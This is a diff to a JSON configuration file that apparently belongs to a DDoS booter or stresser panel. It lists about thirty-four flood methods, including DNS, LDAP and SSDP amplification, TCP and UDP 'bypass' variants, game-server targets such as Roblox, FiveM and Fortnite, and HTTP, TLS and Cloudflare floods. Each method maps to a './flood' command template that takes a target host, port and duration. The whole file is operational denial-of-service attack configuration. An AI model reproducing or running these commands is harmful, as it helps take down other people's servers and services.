@@ -1,138 +1,138 @@
 [
   {
     "name": "dns",
-    "cmd": "./dns {host} {port} {time}"
+    "cmd": "./flood dns {host} {port} {time}"
   },
   {
     "name": "udp",
-    "cmd": "./udp {host} {port} {time}"
+    "cmd": "./flood udp {host} {port} {time}"
   },
   {
     "name": "ldap",
-    "cmd": "./ldap {host} {port} {time}"
+    "cmd": "./flood ldap {host} {port} {time}"
   },
   {
     "name": "ssdp",
-    "cmd": "./ssdp {host} {port} {time}"
+    "cmd": "./flood ssdp {host} {port} {time}"
   },
   {
     "name": "home",
-    "cmd": "./home {host} {port} {time}"
+    "cmd": "./flood home {host} {port} {time}"
   },
   {
     "name": "udpbypass",
-    "cmd": "./udpbypass {host} {port} {time}"
+    "cmd": "./flood udpbypass {host} {port} {time}"
   },
   {
     "name": "tcp",
-    "cmd": "./tcp {host} {port} {time}"
+    "cmd": "./flood tcp {host} {port} {time}"
   },
   {
     "name": "socket",
-    "cmd": "./socket {host} {port} {time}"
+    "cmd": "./flood socket {host} {port} {time}"
   },
   {
     "name": "ovh",
-    "cmd": "./ovh {host} {port} {time}"
+    "cmd": "./flood ovh {host} {port} {time}"
   },
   {
     "name": "tcpmix",
-    "cmd": "./tcpmix {host} {port} {time}"
+    "cmd": "./flood tcpmix {host} {port} {time}"
   },
   {
     "name": "tcpbypass",
-    "cmd": "./tcpbypass {host} {port} {time}"
+    "cmd": "./flood tcpbypass {host} {port} {time}"
   },
   {
     "name": "ack",
-    "cmd": "./ack {host} {port} {time}"
+    "cmd": "./flood ack {host} {port} {time}"
   },
   {
     "name": "game",
-    "cmd": "./game {host} {port} {time}"
+    "cmd": "./flood game {host} {port} {time}"
   },
   {
     "name": "rainbow",
-    "cmd": "./rainbow {host} {port} {time}"
+    "cmd": "./flood rainbow {host} {port} {time}"
   },
   {
     "name": "rocket",
-    "cmd": "./rocket {host} {port} {time}"
+    "cmd": "./flood rocket {host} {port} {time}"
   },
   {
     "name": "roblox",
-    "cmd": "./roblox {host} {port} {time}"
+    "cmd": "./flood roblox {host} {port} {time}"
   },
   {
     "name": "fivem",
-    "cmd": "./fivem {host} {port} {time}"
+    "cmd": "./flood fivem {host} {port} {time}"
   },
   {
     "name": "pubg",
-    "cmd": "./pubg {host} {port} {time}"
+    "cmd": "./flood pubg {host} {port} {time}"
   },
   {
     "name": "fortnite",
-    "cmd": "./fortnite {host} {port} {time}"
+    "cmd": "./flood fortnite {host} {port} {time}"
   },
   {
     "name": "warthunder",
-    "cmd": "./warthunder {host} {port} {time}"
+    "cmd": "./flood warthunder {host} {port} {time}"
   },
   {
     "name": "counter",
-    "cmd": "./counter {host} {port} {time}"
+    "cmd": "./flood counter {host} {port} {time}"
   },
   {
     "name": "samp",
-    "cmd": "./samp {host} {port} {time}"
+    "cmd": "./flood samp {host} {port} {time}"
   },
   {
     "name": "subnet",
-    "cmd": "./subnet {host} {port} {time}"
+    "cmd": "./flood subnet {host} {port} {time}"
   },
   {
     "name": "icmp",
-    "cmd": "./icmp {host} {port} {time}"
+    "cmd": "./flood icmp {host} {port} {time}"
   },
   {
     "name": "http",
-    "cmd": "./http {host} {port} {time}"
+    "cmd": "./flood http {host} {port} {time}"
   },
   {
     "name": "https",
-    "cmd": "./https {host} {port} {time}"
+    "cmd": "./flood https {host} {port} {time}"
   },
   {
     "name": "httpx",
-    "cmd": "./httpx {host} {port} {time}"
+    "cmd": "./flood httpx {host} {port} {time}"
   },
   {
     "name": "rapidflood",
-    "cmd": "./rapidflood {host} {port} {time}"
+    "cmd": "./flood rapidflood {host} {port} {time}"
   },
   {
     "name": "tls",
-    "cmd": "./tls {host} {port} {time}"
+    "cmd": "./flood tls {host} {port} {time}"
   },
   {
     "name": "tlsx",
-    "cmd": "./tlsx {host} {port} {time}"
+    "cmd": "./flood tlsx {host} {port} {time}"
   },
   {
     "name": "bypass",
-    "cmd": "./bypass {host} {port} {time}"
+    "cmd": "./flood bypass {host} {port} {time}"
   },
   {
     "name": "browser",
-    "cmd": "./browser {host} {port} {time}"
+    "cmd": "./flood browser {host} {port} {time}"
   },
   {
     "name": "cache",
-    "cmd": "./cache {host} {port} {time}"
+    "cmd": "./flood cache {host} {port} {time}"
   },
   {
     "name": "cloudflare",
-    "cmd": "./cloudflare {host} {port} {time}"
+    "cmd": "./flood cloudflare {host} {port} {time}"
   }
 ]
